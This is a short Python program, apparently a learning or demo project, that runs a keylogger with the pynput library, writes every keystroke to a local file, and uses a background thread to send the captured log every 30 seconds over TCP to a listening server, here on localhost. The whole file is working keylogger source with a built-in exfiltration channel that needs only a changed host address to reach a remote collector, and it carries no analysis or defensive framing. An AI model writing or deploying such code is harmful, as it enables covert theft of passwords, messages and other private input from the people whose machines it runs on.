import socket
import threading
import time
from pynput import keyboard
import os

LOG_FILE = "key_log.txt"
RECEIVED_FILE = "received_log.txt"
HOST = '127.0.0.1'
PORT = 9999

log = ""

# -------------------- Keylogger --------------------

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        else:
            log += f'[{key.name}]'

    with open(LOG_FILE, "a") as file:
        file.write(log)
    log = ""

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("🔍 Keylogger started...")
    return listener

# -------------------- TCP Server --------------------

def tcp_server():
    if os.path.exists(RECEIVED_FILE):
        os.remove(RECEIVED_FILE)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"🖥️ Server listening on {HOST}:{PORT}...")
        while True:
            conn, addr = s.accept()
            with conn:
                print(f"📥 Receiving log from {addr}...")
                data = conn.recv(4096)
                if data:
                    with open(RECEIVED_FILE, "ab") as f:
                        f.write(data)
                    print("✅ Log written to", RECEIVED_FILE)

# -------------------- TCP Client --------------------

def send_log():
    while True:
        time.sleep(30)  # Send every 30 seconds
        if not os.path.exists(LOG_FILE):
            continue
        try:
            with open(LOG_FILE, "rb") as file:
                data = file.read()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s.sendall(data)
                print("📤 Log sent to server.")
        except Exception as e:
            print(f"❌ Error sending log: {e}")

# -------------------- Main --------------------

if __name__ == "__main__":
    # Start TCP server in a background thread
    server_thread = threading.Thread(target=tcp_server, daemon=True)
    server_thread.start()

    # Start log sender thread
    sender_thread = threading.Thread(target=send_log, daemon=True)
    sender_thread.start()

    # Start keylogger
    listener = start_keylogger()

    # Keep main thread alive
    listener.join()
